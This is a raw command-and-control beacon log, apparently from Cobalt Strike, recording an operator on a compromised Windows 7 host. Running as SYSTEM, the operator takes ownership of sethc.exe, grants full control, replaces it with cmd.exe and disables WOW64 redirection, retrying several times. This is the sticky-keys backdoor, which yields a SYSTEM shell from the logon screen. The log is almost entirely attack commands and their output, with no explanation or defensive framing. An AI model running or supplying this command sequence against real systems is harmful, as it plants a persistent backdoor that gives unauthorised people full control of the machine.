01/28 17:04:48 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 856; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/28 18:33:38 [task] Tasked beacon to run: 
01/28 18:33:38 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
01/28 18:33:38 [task] Tasked beacon to run: copy cmd.exe sethc.exe
01/28 18:33:38 [task] Tasked beacon to run: sethc /c ipconfig
01/28 18:33:39 [checkin] host called home, sent: 225 bytes
01/28 18:33:40 [output]
received output:
C:\Windows\System32\sethc.exe: 句柄无效。
已成功处理 0 个文件; 处理 1 个文件时失败


01/28 18:33:40 [output]
received output:
系统找不到指定的文件。


01/28 18:34:24 [input] <neo> shell sethc /c ipconfig
01/28 18:34:24 [task] Tasked beacon to run: sethc /c ipconfig
01/28 18:34:40 [checkin] host called home, sent: 48 bytes
01/28 18:36:06 [task] Tasked beacon to run: sethc /c ipconfig
01/28 18:36:06 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
01/28 18:36:06 [task] Tasked beacon to run: copy cmd.exe sethc.exe
01/28 18:36:06 [task] Tasked beacon to run: sethc /c ipconfig
01/28 18:36:40 [checkin] host called home, sent: 242 bytes
01/28 18:36:40 [output]
received output:
C:\Windows\System32\sethc.exe: 句柄无效。
已成功处理 0 个文件; 处理 1 个文件时失败


01/28 18:36:40 [output]
received output:
系统找不到指定的文件。


01/28 18:36:50 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sethc.exe" /A
01/28 18:36:50 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
01/28 18:36:50 [task] Tasked beacon to run: copy cmd.exe sethc.exe
01/28 18:36:50 [task] Tasked beacon to run: sethc /c ipconfig
01/28 18:37:40 [checkin] host called home, sent: 270 bytes
01/28 18:37:40 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\sethc.exe" 现在由管理员组所有。


01/28 18:37:40 [output]
received output:
已处理的文件: C:\Windows\System32\sethc.exe
已成功处理 1 个文件; 处理 0 个文件时失败


01/28 18:37:40 [output]
received output:
系统找不到指定的文件。


01/28 18:38:45 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sethc.exe" /A
01/28 18:38:45 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
01/28 18:38:45 [task] cd C:\Windows\System32
01/28 18:38:45 [task] Tasked beacon to run: copy cmd.exe sethc.exe
01/28 18:38:45 [task] Tasked beacon to run: sethc /c ipconfig
01/28 18:39:40 [checkin] host called home, sent: 297 bytes
01/28 18:39:41 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\sethc.exe" 现在由管理员组所有。


01/28 18:39:41 [output]
received output:
已处理的文件: C:\Windows\System32\sethc.exe
已成功处理 1 个文件; 处理 0 个文件时失败


01/28 18:39:41 [output]
received output:
已复制         1 个文件。


01/28 18:39:41 [output]
received output:

Windows IP 配置


以太网适配器 本地连接:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::dc70:1ea3:67b5:311%11
   IPv4 地址 . . . . . . . . . . . . : 172.17.2.54
   子网掩码  . . . . . . . . . . . . : 255.255.254.0
   默认网关. . . . . . . . . . . . . : 172.17.2.1

隧道适配器 isatap.{A8E7B51B-9069-45DB-BA99-054EA369046E}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 


01/28 18:41:51 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 856; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/28 18:42:18 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sethc.exe" /A
01/28 18:42:18 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
01/28 18:42:18 [task] cd C:\Windows\System32
01/28 18:42:18 [task] Tasked beacon to run: copy cmd.exe sethc.exe
01/28 18:42:18 [task] Tasked beacon to run: sethc /c calc
01/28 18:42:41 [checkin] host called home, sent: 293 bytes
01/28 18:42:51 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\sethc.exe" 现在由管理员组所有。


01/28 18:42:51 [output]
received output:
已处理的文件: C:\Windows\System32\sethc.exe
已成功处理 1 个文件; 处理 0 个文件时失败


01/28 18:42:51 [output]
received output:
已复制         1 个文件。


01/28 19:00:01 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sethc.exe" /A
01/28 19:00:01 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
01/28 19:00:01 [task] Tasked beacon to run: copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
01/28 19:00:01 [task] Tasked beacon to run: C:\Windows\System32\sethc.exe /c calc
01/28 19:00:51 [checkin] host called home, sent: 330 bytes
01/28 19:00:58 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\sethc.exe" 现在由管理员组所有。


01/28 19:00:58 [output]
received output:
已处理的文件: C:\Windows\System32\sethc.exe
已成功处理 1 个文件; 处理 0 个文件时失败


01/28 19:00:58 [output]
received output:
已复制         1 个文件。


01/28 19:05:49 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sethc.exe" /A
01/28 19:05:49 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
01/28 19:05:49 [task] Tasked beacon to run: copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
01/28 19:05:49 [task] Tasked beacon to run: C:\Windows\System32\sethc.exe /c ipconfig
01/28 19:05:58 [checkin] host called home, sent: 334 bytes
01/28 19:05:58 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\sethc.exe" 现在由管理员组所有。


01/28 19:05:58 [output]
received output:
已处理的文件: C:\Windows\System32\sethc.exe
已成功处理 1 个文件; 处理 0 个文件时失败


01/28 19:05:58 [output]
received output:
已复制         1 个文件。


01/28 19:05:58 [output]
received output:

Windows IP 配置


以太网适配器 本地连接:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::dc70:1ea3:67b5:311%11
   IPv4 地址 . . . . . . . . . . . . : 172.17.2.54
   子网掩码  . . . . . . . . . . . . : 255.255.254.0
   默认网关. . . . . . . . . . . . . : 172.17.2.1

隧道适配器 isatap.{A8E7B51B-9069-45DB-BA99-054EA369046E}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 


01/28 19:25:51 [task] Tasked beacon to run: rundll32.exe kernel32.dll Wow64DisableWow64FsRedirection
01/28 19:25:51 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sethc.exe" /A
01/28 19:25:51 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
01/28 19:25:51 [task] cd C:\Windows\System32
01/28 19:25:51 [task] Tasked beacon to run: copy cmd.exe sethc.exe
01/28 19:25:51 [task] Tasked beacon to run: sethc /c calc
01/28 19:25:58 [checkin] host called home, sent: 380 bytes
01/28 19:26:09 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\sethc.exe" 现在由管理员组所有。


01/28 19:26:09 [output]
received output:
已处理的文件: C:\Windows\System32\sethc.exe
已成功处理 1 个文件; 处理 0 个文件时失败


01/28 19:26:09 [output]
received output:
已复制         1 个文件。


01/28 19:33:43 [task] Tasked beacon to run: C:\Windows\System32\rundll32.exe kernel32.dll Wow64DisableWow64FsRedirection
01/28 19:33:43 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sethc.exe" /A
01/28 19:33:43 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
01/28 19:33:43 [task] cd C:\Windows\System32
01/28 19:33:43 [task] Tasked beacon to run: copy cmd.exe sethc.exe
01/28 19:33:43 [task] Tasked beacon to run: sethc /c calc
01/28 19:34:09 [checkin] host called home, sent: 400 bytes
01/28 19:34:19 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\sethc.exe" 现在由管理员组所有。


01/28 19:34:19 [output]
received output:
已处理的文件: C:\Windows\System32\sethc.exe
已成功处理 1 个文件; 处理 0 个文件时失败


01/28 19:34:19 [output]
received output:
已复制         1 个文件。


01/28 19:39:23 [task] Tasked beacon to run: C:\Windows\System32\rundll32.exe kernel32.dll Wow64DisableWow64FsRedirection
01/28 19:39:23 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sethc.exe" /A
01/28 19:39:23 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
01/28 19:39:23 [task] cd C:\Windows\System32
01/28 19:39:23 [task] Tasked beacon to run: copy cmd.exe sethc.exe
01/28 19:39:23 [task] Tasked beacon to run: sethc /c calc
01/28 19:40:19 [checkin] host called home, sent: 400 bytes
01/28 19:40:29 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\sethc.exe" 现在由管理员组所有。


01/28 19:40:29 [output]
received output:
已处理的文件: C:\Windows\System32\sethc.exe
已成功处理 1 个文件; 处理 0 个文件时失败


01/28 19:40:29 [output]
received output:
已复制         1 个文件。


01/28 19:42:10 [task] Tasked beacon to run: C:\Windows\System32\rundll32.exe kernel32.dll Wow64DisableWow64FsRedirection
01/28 19:42:10 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sethc.exe" /A
01/28 19:42:10 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
01/28 19:42:10 [task] cd C:\Windows\System32
01/28 19:42:10 [task] Tasked beacon to run: copy cmd.exe sethc.exe
01/28 19:42:10 [task] Tasked beacon to run: sethc /c calc
01/28 19:42:30 [checkin] host called home, sent: 400 bytes
01/28 19:42:40 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\sethc.exe" 现在由管理员组所有。


01/28 19:42:40 [output]
received output:
已处理的文件: C:\Windows\System32\sethc.exe
已成功处理 1 个文件; 处理 0 个文件时失败


01/28 19:42:40 [output]
received output:
已复制         1 个文件。


01/28 19:46:00 [task] Tasked beacon to run: C:\Windows\System32\rundll32.exe kernel32.dll Wow64DisableWow64FsRedirection
01/28 19:46:00 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sethc.exe" /A
01/28 19:46:00 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
01/28 19:46:00 [task] cd C:\Windows\System32
01/28 19:46:00 [task] Tasked beacon to run: copy cmd.exe sethc.exe
01/28 19:46:00 [task] Tasked beacon to run: sethc /c calc
01/28 19:46:20 [task] Tasked beacon to run: C:\Windows\System32\rundll32.exe kernel32.dll Wow64RevertWow64FsRedirection
01/28 19:46:20 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sethc.exe" /A
01/28 19:46:20 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
01/28 19:46:20 [task] cd C:\Windows\System32
01/28 19:46:20 [task] Tasked beacon to run: copy cmd.exe sethc.exe
01/28 19:46:20 [task] Tasked beacon to run: sethc /c calc
01/28 19:46:40 [checkin] host called home, sent: 799 bytes
01/28 19:47:00 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\sethc.exe" 现在由管理员组所有。


01/28 19:47:00 [output]
received output:
已处理的文件: C:\Windows\System32\sethc.exe
已成功处理 1 个文件; 处理 0 个文件时失败


01/28 19:47:00 [output]
received output:
已复制         1 个文件。


01/28 19:47:00 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\sethc.exe" 现在由管理员组所有。


01/28 19:47:00 [output]
received output:
已处理的文件: C:\Windows\System32\sethc.exe
已成功处理 1 个文件; 处理 0 个文件时失败


01/28 19:47:00 [output]
received output:
另一个程序正在使用此文件，进程无法访问。
已复制         0 个文件。


